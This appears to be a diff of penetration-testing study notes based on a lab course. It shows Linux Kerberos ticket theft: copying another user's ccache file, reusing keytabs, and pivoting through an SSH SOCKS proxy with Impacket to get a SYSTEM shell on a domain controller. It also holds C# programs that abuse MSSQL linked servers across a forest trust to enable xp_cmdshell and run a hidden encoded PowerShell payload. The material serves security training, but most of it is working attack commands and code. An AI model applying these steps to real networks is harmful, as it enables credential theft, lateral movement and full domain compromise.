+If it's been a while since the tickets were created, they may have expired. However, if it's within the renewal timeframe, we can renew it without entering a password using kinit with the -R flag.
+
+```bash
+root@linuxvictim:~# kinit -R
+```
+
+Listing 70 - Renewing an expired TGT
+
+Normally, keytab files would be written somewhere safe such as the user's home folder. In our case, since we've compromised the server entirely and have root access, the location wouldn't matter.
+Some users will set weak keytab file permissions for ease of use or for sharing with other accounts, so it's worthwhile to check for readable keytabs if Kerberos is in use on the system.
+Now that our root user has the keytab files loaded, we can authenticate as the domain admin and access any resources they have access to.
+
+Let's attempt to access the domain controller's C drive.
+
+```bash
+root@linuxvictim:~# smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
+WARNING: The "syslog" option is deprecated
+Try "help" to get a list of possible commands.
+```
+
+Accessing the domain controller's C drive as the domain admin
+
+```
+smb: \> ls
+```
+
+Success! We can use our stolen keytab to access the domain controller using Kerberos authentication.
+
+### Attacking Using Credential Cache Files
+
+As we turn our attention to attacking ccache files, let's consider 2 attack scenarios.
+
+1. If we compromise an active user's shell session, we can essentially act as the user in question and use their current Kerberos tickets. Gaining an initial TGT would require the user's Active Directory password. However, if the user is already authenticated, we can just use their current tickets.
+
+2. To authenticate by compromising a user's ccache file. As we noted earlier, a user's ccache file is stored in /tmp with a format like /tmp/krb5cc_<randomstring>. The file is typically only accessible by the owner. Because of this, it's unlikely that we will be able to steal a user's ccache file as an unprivileged user.
+
+If we have privileged access and don't want to log in as the user in question, or we are able to read the user's files but don't have direct shell access, we can still copy the victim's ccache file and load it as our own.
+
+First, we'll ssh to the linuxvictim machine as the offsec user who has sudo permissions. We can list the ccache files in /tmp with the following command.
+
+Listing ccache files in /tmp
+
+```bash
+ls -al /tmp/krb5cc_*
+```
+
+We can locate the domain administrator's ccache file by inspecting the file owners. Let's copy the domain administrator's ccache file and set the ownership of the new file to our offsec user.
+
+Copying the ccache file
+
+```bash
+sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
+sudo chown offsec:offsec /tmp/krb5cc_minenow
+ls -al /tmp/krb5cc_minenow
+```
+
+To use the ccache file, we need to set the **KRB5CCNAME** environment variable. This variable gives the path of the credential cache file so that Kerberos utilities can find it.
+
+Clear our old credentials
+
+```bash
+kdestroy
+klist
+```
+
+Set the variable and point it to our newly-copied ccache file, then list our available tickets.
+
+```bash
+export KRB5CCNAME=/tmp/krb5cc_minenow
+klist
+```
+
+We now have the administrator user's TGT in our credential cache and we can request service tickets on their behalf.
+
+Getting service tickets with our stolen ccache file
+
+```bash
+kvno MSSQLSvc/DC01.corp1.com:1433
+klist
+```
+
+We now have the user's Kerberos tickets, we can use those tickets to authenticate to services that are Kerberos-enabled on the user's behalf.
+
+### Using Kerberos with Impacket
+
+Impacket1 is a set of tools used for low-level manipulation of network protocols and exploiting network-based utilities. This toolset can also be used to abuse Kerberos on Linux. Impacket is available in Kali at /usr/share/doc/python3-impacket/.
+One popular module from Impacket is psexec. This module is similar to Microsoft Sysinternal's psexec utility. It allows us to perform actions on a remote Windows host.
+
+In order to use Impacket utilities in our lab environment from our Kali VM, we need to do some initial setup. This will configure our Kali VM to be able to connect to the Kerberos environment properly.
+
+In the scenario described in this section, we assume that we have compromised a domain joined host (linuxvictim) and stolen a ccache file. Rather than perform any lateral movement from the linuxvictim box, we'll execute our attack directly from our Kali system with Impacket.
+
+To do so, we'll first need to copy our victim's stolen ccache file to our Kali VM and set the KRB5CCNAME environment variable as we did previously on linuxvictim. We can use the same ccache file as the last example.
+
+```bash
+scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow
+export KRB5CCNAME=/tmp/krb5cc_minenow
+```
+
+Listing 76 - Downloading the ccache file and setting the KRB5CCNAME environment variable
+As before, this will allow us to use the victim's Kerberos tickets as our own.
+We'll then need to install the Kerberos linux client utilities. This will allow us to perform our ticket manipulation tasks (such as kinit, etc.) that we performed earlier on our linuxvictim VM, but now from our Kali VM.
+
+Installing Kerberos client utilities
+
+```bash
+sudo apt install krb5-user
+```
+
+When prompted for a kerberos realm, we'll enter "corp1.com". This lets the Kerberos tools know which domain we're connecting to.
+We'll need to add the domain controller IP to our Kali VM to resolve the domain properly. We can get the IP address of the domain controller from the linuxvictim VM.
+
+Getting the IP address of the domain controller
+
+```bash
+offsec@linuxvictim:~$ host corp1.com
+```
+
+Now that the client utilities are installed, the target domain controller (dc01.corp1.com) and the generic domain (corp1.com) need to be added to our `/etc/hosts` file.
+
+Contents of our Kali VM's `/etc/hosts` file
+
+```
+127.0.0.1	localhost
+192.168.120.40  controller
+192.168.120.45  linuxvictim
+192.168.120.5 CORP1.COM DC01.CORP1.COM
+```
+
+This allows Kerberos to properly resolve the domain names for the domain controller.
+In order to use our Kerberos tickets, we will need to have the correct source IP, which in this case is the compromised linuxvictim host that is joined to the domain. Because of this, we'll need to setup a SOCKS proxy on linuxvictim and use proxychains on Kali to pivot through the domain joined host when interacting with Kerberos.
+To do so, we'll need to comment out the line for proxy_dns in /etc/proxychains.conf to prevent issues with domain name resolution while using proxychains.
+
+Commented out proxy_dns line in proxychains configuration
+
+```
+# proxychains.conf  VER 3.1
+#
+#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
+#       
+...
+# Proxy DNS requests - no leak for DNS data
+#proxy_dns 
+...
+```
+
+Once these settings are in place, we need to set up a SOCKS server using ssh on the server we copied the ccache file from, which in our case is linuxvictim.
+
+```bash
+kali@kali:~$ ssh offsec@linuxvictim -D 9050
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64)
+...
+offsec@linuxvictim:~$
+```
+
+Listing 81 - Setting up an SSH tunnel
+
+The -D parameter specifies the port we'll be using for proxychains (defined in /etc/proxychains.conf) in order to tunnel Kerberos requests.
+
+Impacket has several scripts available that will help us enumerate and exploit Active Directory. For example, we can examine the list of domain users with GetADUsers.py.
+
+Listing Active Directory users
+
+```bash
+proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
+```
+
+It's also possible to get a list of the SPNs available to our Kerberos user.
+
+Gathering SPNs for our Kerberos user
+
+```bash
+proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
+```
+
+This time the output contains the list of SPNs available.
+
+If we want to gain a shell on the server, we can then run psexec with the following command.
+
+Getting a shell with psexec
+
+```bash
+proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
+```
+
+Using Impacket's psexec module and our stolen Kerberos tickets, we are now SYSTEM on the domain controller and can do whatever we please.
+
+As we've demonstrated, Kerberos functionality on Linux can provide an excellent attack vector for compromising a domain and moving laterally within the network. Knowing how Linux handles Kerberos authentication and how to exploit it can make a significant difference in a penetration test.
+
 # Windows Credentials
 
 ## SAM Database
@@ -7392,4 +8540,225 @@ This enumeration also works across forest trust and allows us to locate SPNs in 
 
 ```bat
 setspn -T corp2.com -Q MSSQLSvc/*
+```
+
+Located multiple MSSQL servers across both domains and forests > attempt to log in to them
+
+`Sql.exe`
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "dc01.corp2.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+            Console.WriteLine("Connected to " + sqlServer);
+            String querylogin = "SELECT SYSTEM_USER;";
+            SqlCommand command = new SqlCommand(querylogin, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Logged in as: " + reader[0]);
+            reader.Close();
+
+            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
+            command = new SqlCommand(querypublicrole, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Int32 role = Int32.Parse(reader[0].ToString());
+            if (role == 1)
+            {
+                Console.WriteLine("User is a member of public role");
+            }
+            else
+            {
+                Console.WriteLine("User is NOT a member of public role");
+            }
+            reader.Close();
+
+            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
+            command = new SqlCommand(querysysadminrole, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            role = Int32.Parse(reader[0].ToString());
+            if (role == 1)
+            {
+                Console.WriteLine("User is a member of sysadmin role");
+            }
+            else
+            {
+                Console.WriteLine("User is NOT a member of sysadmin role");
+            }
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+We obtain access to a MSSQL database, this time across the forest trust. If the database contains any misconfigurations, this could allow us to elevate privileges to sysadmin and compromise the operating system itself.
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "rdc01.corp1.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            String execCmd = "EXEC sp_linkedservers;";
+
+            SqlCommand command = new SqlCommand(execCmd, con);
+            SqlDataReader reader = command.ExecuteReader();
+
+            while (reader.Read())
+            {
+                Console.WriteLine("Linked SQL server: " + reader[0]);
+            }
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+Determine the login context.
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "RDC01.CORP1.COM";
+            String linkedSqlServer = "DC01.CORP2.COM";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            String querylogin = "SELECT SYSTEM_USER;";
+            SqlCommand command = new SqlCommand(querylogin, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Executing as the login " + reader[0] + " on " + sqlServer);
+            reader.Close();
+
+            String execCmd = "select systemuser from openquery(\"" + linkedSqlServer + "\", 'SELECT SYSTEM_USER as systemuser')";
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Executing as the login " + reader[0] + " on " + linkedSqlServer);
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+Get code execution on `dc01.corp2.com`
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "RDC01.CORP1.COM";
+            String linkedSqlServer = "DC01.CORP2.COM";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            String execCmd = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [" + linkedSqlServer + "]";
+            SqlCommand command = new SqlCommand(execCmd, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Close();
+
+            execCmd = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [" + linkedSqlServer + "]";
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            execCmd = "EXEC ('xp_cmdshell ''powershell -exec bypass -nop -w hidden -e <base64>'';') AT [" + linkedSqlServer + "]";
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
 ```
